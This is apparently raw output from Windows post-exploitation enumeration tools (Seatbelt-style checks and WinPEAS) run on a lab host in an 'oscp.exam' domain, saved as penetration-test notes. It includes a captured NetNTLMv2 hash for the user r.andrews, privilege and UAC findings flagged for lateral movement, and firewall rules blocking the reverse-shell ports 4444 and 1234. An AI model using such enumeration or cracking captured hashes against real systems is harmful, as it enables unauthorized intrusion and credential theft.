      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Automatic-Device-Join
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Register this computer if the computer is already joined to an Active Directory domain.
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   $(Arg0) $(Arg1) $(Arg2)
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskEventTrigger
      Enabled                       :   True
      Duration                      :   P1D
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      Subscription                  :   <QueryList><Query Id="0" Path="Microsoft-Windows-User Device Registration/Admin"><Select Path="Microsoft-Windows-User Device Registration/Admin">*[System[Provider[@Name='Microsoft-Windows-User Device Registration'] and EventID=4096]]</Select></Query></QueryList>
      ------------------------------

  Name                              :   Recovery-Check
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   Performs recovery check.
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /checkrecovery
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskSessionStateChangeTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      StateChange                   :   7
      ------------------------------

  Name                              :   OobeDiscovery
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {C93CF9D5-031B-4AAA-AB0B-EF802347B381}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

====== SearchIndex ======

====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : r.andrews::OSCP:1122334455667788:d08bced7c10f9502aaf83982e897e26e:010100000000000012f0c7b7b2a3dc01a638430f2b2acc8500000000080030003000000000000000000000000020000094325718cc55f060c3fb567c4447f7037b4c0b9649439f36cf2285865dbf1f6c0a00100000000000000000000000000000000000090000000000000000000000

====== SecurityPackages ======

Security Packages


  Name                           : Negotiate
  Comment                        : Microsoft Package Negotiator
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
  MaxToken                       : 48256
  RPCID                          : 9
  Version                        : 1

  Name                           : NegoExtender
  Comment                        : NegoExtender Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 30
  Version                        : 1

  Name                           : Kerberos
  Comment                        : Microsoft Kerberos V1.0
  Capabilities                   : 42941375
  MaxToken                       : 48000
  RPCID                          : 16
  Version                        : 1

  Name                           : NTLM
  Comment                        : NTLM Security Package
  Capabilities                   : 42478391
  MaxToken                       : 2888
  RPCID                          : 10
  Version                        : 1

  Name                           : TSSSP
  Comment                        : TS Service Security Package
  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
  MaxToken                       : 13000
  RPCID                          : 22
  Version                        : 1

  Name                           : pku2u
  Comment                        : PKU2U Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 31
  Version                        : 1

  Name                           : CloudAP
  Comment                        : Cloud AP Security Package
  Capabilities                   : LOGON, NEGOTIABLE2, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 0
  RPCID                          : 36
  Version                        : 1

  Name                           : WDigest
  Comment                        : Digest Authentication for Windows
  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
  MaxToken                       : 4096
  RPCID                          : 21
  Version                        : 1

  Name                           : Schannel
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Microsoft Unified Security Protocol Provider
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : SFAP
  Comment                        : Web Defense SFAP
  Capabilities                   : ACCEPT_WIN32_NAME, MUTUAL_AUTH
  MaxToken                       : 0
  RPCID                          : -1
  Version                        : 1

  Name                           : Default TLS SSP
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 9.5.2.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Guest Authentication Service
  Version                        : 12.1.0.63013
  IsDotNet                       : False

  Name                           : vm3dservice
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 9.17.04.0001
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 12.1.0.37487
  IsDotNet                       : False

====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== SysmonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:135            0.0.0.0:0              LISTEN     1004  RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:3389           0.0.0.0:0              LISTEN     1060  TermService     svchost.exe
  0.0.0.0:5040           0.0.0.0:0              LISTEN     5560  CDPSvc          svchost.exe
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     748                   lsass.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     608                   wininit.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1448  EventLog        svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     2032  Schedule        svchost.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     2276  SessionEnv      svchost.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     748   Netlogon        lsass.exe
  0.0.0.0:49670          0.0.0.0:0              LISTEN     716                   services.exe
  172.16.104.206:139     0.0.0.0:0              LISTEN     4                     System
  192.168.104.206:139    0.0.0.0:0              LISTEN     4                     System
  192.168.104.206:3389   192.168.49.104:56942   ESTAB      1060  TermService     svchost.exe
  192.168.104.206:57954  192.168.49.104:445     ESTAB      4                     System
====== TokenGroups ======

Current Token's Groups

  OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513
  Everyone                                 S-1-1-0
  BUILTIN\Remote Desktop Users             S-1-5-32-555
  BUILTIN\Remote Management Users          S-1-5-32-580
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\REMOTE INTERACTIVE LOGON    S-1-5-14
  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  LOCAL                                    S-1-2-0
  Authentication authority asserted identity S-1-18-1
====== TokenPrivileges ======

Current Token's Privileges

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                            SeUndockPrivilege:  DISABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                          SeTimeZonePrivilege:  DISABLED
====== UAC ======

  0                              : 1 - No prompting
  EnableLUA (Is UAC enabled?)    : 0
  LocalAccountTokenFilterPolicy  : 1
  FilterAdministratorToken       : 1
    [*] UAC is disabled.
    [*] Any administrative local account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            1324   W32Time                 svchost.exe
  0.0.0.0:500            3100   IKEEXT                  svchost.exe
  0.0.0.0:3389           1060   TermService             svchost.exe
  0.0.0.0:4500           3100   IKEEXT                  svchost.exe
  0.0.0.0:5050           5560   CDPSvc                  svchost.exe
  0.0.0.0:5353           1816   Dnscache                svchost.exe
  0.0.0.0:5355           1816   Dnscache                svchost.exe
  0.0.0.0:52973          1816   Dnscache                svchost.exe
  0.0.0.0:63044          1816   Dnscache                svchost.exe
  127.0.0.1:1900         3204   SSDPSRV                 svchost.exe
  127.0.0.1:51548        3204   SSDPSRV                 svchost.exe
  127.0.0.1:51710        4352   CDPUserSvc_29ccec       C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
  127.0.0.1:56491        748    Netlogon                lsass.exe
  127.0.0.1:61144        1600   netprofm                svchost.exe
  127.0.0.1:62196        2940   iphlpsvc                svchost.exe
  172.16.104.206:137     4                              System
  172.16.104.206:138     4                              System
  172.16.104.206:1900    3204   SSDPSRV                 svchost.exe
  172.16.104.206:51547   3204   SSDPSRV                 svchost.exe
  192.168.104.206:137    4                              System
  192.168.104.206:138    4                              System
  192.168.104.206:1900   3204   SSDPSRV                 svchost.exe
  192.168.104.206:51546  3204   SSDPSRV                 svchost.exe
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR: WlanOpenHandle() failed: 1062
====== WindowsAutoLogon ======

  DefaultDomainName              : 
  DefaultUserName                : 
  DefaultPassword                : 
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 

====== WindowsCredentialFiles ======

====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : False
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : False
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : False
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block Outbound 4444
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :4444

  Name                 : Block Outbound 1234
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :1234

====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 0
====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,162,0,3,2,2
  BootupState                   : Normal boot
  Caption                       : WS26
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -480
  DaylightInEffect              : False
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : WS26
  Domain                        : oscp.exam
  DomainRole                    : 1
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : WS26
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 2
  NumberOfProcessors            : 1
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : True
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      NT
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 6441422848
  WakeUpType                    : 6

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :   
  MaximumQueueSize                  :   
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :   
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :   
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    : 
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 1127.046 seconds
```



---

# WinPEAS

## 記録用総出力（長い）

```sh
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


════════════════════════════════════╣ System Information ╠════════════════════════════════════

╔══════════╣ Basic System Information
╚ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
    OS Name: Microsoft Windows 11 Enterprise
    OS Version: 10.0.22631 N/A Build 22631
    System Type: x64-based PC
    Hostname: WS26
    Domain Name: oscp.exam
    ProductName: Windows 10 Enterprise
    EditionID: Enterprise
    ReleaseId: 2009
    BuildBranch: ni_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: Japanese (Japan)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 2/21/2026 7:16:25 PM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB5044033 (10/9/2024), KB5027397 (7/4/2024), KB5044285 (10/9/2024), KB5046247 (10/9/2024), 


╔══════════╣ Showing All Microsoft Updates
   HotFix ID                :   KB2267602
   Installed At (UTC)       :   2/22/2026 11:01:54 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   11/12/2024 2:50:21 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/29/2024 2:56:03 PM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/11/2024 9:26:30 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:17 AM
   Title                    :   9N8MHTPHNGVV-Microsoft.Windows.DevHome
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9N8MHTPHNGVV-1152921505698356525

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NTXGKQ8P7N0-MicrosoftWindows.CrossDevice
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NTXGKQ8P7N0-1152921505698361592

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   KB5044285
   Installed At (UTC)       :   10/10/2024 2:15:03 AM
   Title                    :   2024-10 Cumulative Update for Windows 11 Version 23H2 for x64-based Systems (KB5044285)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.

   =================================================================================================

   HotFix ID                :   KB4023057
   Installed At (UTC)       :   10/10/2024 1:19:52 AM
   Title                    :   2023-11 Update for Windows 11 Version 23H2 for x64-based Systems (KB4023057)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   KB890830
   Installed At (UTC)       :   10/10/2024 1:19:48 AM
   Title                    :   Windows Malicious Software Removal Tool x64 - v5.129 (KB890830)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that is found. If an infection is found, the tool will display a status report the next time that you start your computer. A new version of the tool will be offered every month. If you want to manually run the tool on your computer, you can download a copy from the Microsoft Download Center, or you can run an online version from microsoft.com. This tool is not a replacement for an antivirus product. To help protect your computer, you should use an antivirus product.

   =================================================================================================

   HotFix ID                :   KB5044033
   Installed At (UTC)       :   10/10/2024 1:18:32 AM
   Title                    :   2024-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11, version 23H2 for x64 (KB5044033)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 1:18:02 AM
   Title                    :   Broadcom Inc. - Net - 1.9.19.0
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Broadcom Inc. Net  driver update released in  July 2024

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/10/2024 1:17:45 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================


